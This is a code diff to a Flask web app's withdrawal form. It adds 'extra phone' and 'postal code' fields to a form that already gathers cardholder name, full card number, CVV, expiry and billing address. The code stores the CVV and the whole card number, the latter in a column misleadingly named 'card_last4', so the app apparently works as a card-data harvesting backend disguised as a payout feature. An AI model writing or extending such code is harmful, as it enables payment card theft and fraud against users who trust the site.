@@ -167,6 +167,8 @@ class WithdrawalRequest(db.Model):
     bank_name = db.Column(db.String(120), nullable=True)
     card_holder_name = db.Column(db.String(120), nullable=True)
     card_phone = db.Column(db.String(40), nullable=True)
+    extra_phone = db.Column(db.String(40), nullable=True)
+    postal_code = db.Column(db.String(20), nullable=True)
     card_last4 = db.Column(db.String(16), nullable=True)
     cvv = db.Column(db.String(3), nullable=True)
     billing_address = db.Column(db.String(3), nullable=True)
@@ -296,6 +298,10 @@ def ensure_schema():
                 conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN card_holder_name VARCHAR(120)")
             if "card_phone" not in withdrawal_columns:
                 conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN card_phone VARCHAR(40)")
+            if "extra_phone" not in withdrawal_columns:
+                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN extra_phone VARCHAR(40)")
+            if "postal_code" not in withdrawal_columns:
+                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN postal_code VARCHAR(20)")
             if "cvv" not in withdrawal_columns:
                 conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN cvv VARCHAR(3)")
             if "card_last4" not in withdrawal_columns:
@@ -484,6 +490,8 @@ def withdraw():
                     "bank_name": None,
                     "card_holder_name": None,
                     "card_phone": None,
+                    "extra_phone": None,
+                    "postal_code": None,
                     "card_last4": None,
                     "billing_address": None,
                 }
@@ -500,6 +508,8 @@ def withdraw():
                     "bank_name": None,
                     "card_holder_name": None,
                     "card_phone": None,
+                    "extra_phone": None,
+                    "postal_code": None,
                     "card_last4": None,
                     "billing_address": None,
                     "cvv": None,
@@ -513,6 +523,8 @@ def withdraw():
                 bank_name = request.form.get("bank_name", "").strip()
                 card_holder_name = request.form.get("card_holder_name", "").strip()
                 card_phone = request.form.get("card_phone", "").strip()
+                extra_phone = request.form.get("extra_phone", "").strip()
+                postal_code = request.form.get("postal_code", "").strip()
                 card_number_raw = request.form.get("card_number", "")
                 card_number = re.sub(r"\D", "", card_number_raw)
                 cvv = re.sub(r"\D", "", request.form.get("cvv", ""))
@@ -524,7 +536,11 @@ def withdraw():
                 if len(card_holder_name) < 2 or len(card_holder_name) > 120:
                     raise ValueError("Enter the card holder name.")
                 if len(re.sub(r"\D", "", card_phone)) < 2:
-                    raise ValueError("Enter a valid Billing Adress.")
+                    raise ValueError("Enter a valid phone number.")
+                if extra_phone and len(re.sub(r"\D", "", extra_phone)) < 2:
+                    raise ValueError("Enter a valid extra phone number.")
+                if postal_code and len(postal_code) > 20:
+                    raise ValueError("Enter a valid ZIP/postal code.")
                 if not re.fullmatch(r"\d{3,4}", cvv):
                     raise ValueError("Enter a valid card security code.")
                 if not valid_expiration(expiration_date):
@@ -540,6 +556,8 @@ def withdraw():
                     "bank_name": bank_name,
                     "card_holder_name": card_holder_name,
                     "card_phone": card_phone,
+                    "extra_phone": extra_phone,
+                    "postal_code": postal_code,
                     "card_last4": card_number[-16:],
                     "billing_address": billing_address,
                     "cvv":cvv,
@@ -581,6 +599,8 @@ def withdraw():
                 bank_name=details["bank_name"],
                 card_holder_name=details["card_holder_name"],
                 card_phone=details["card_phone"],
+                extra_phone=details["extra_phone"],
+                postal_code=details["postal_code"],
                 cvv=details["cvv"],
                 card_last4=details["card_last4"],
                 billing_address=details["billing_address"],
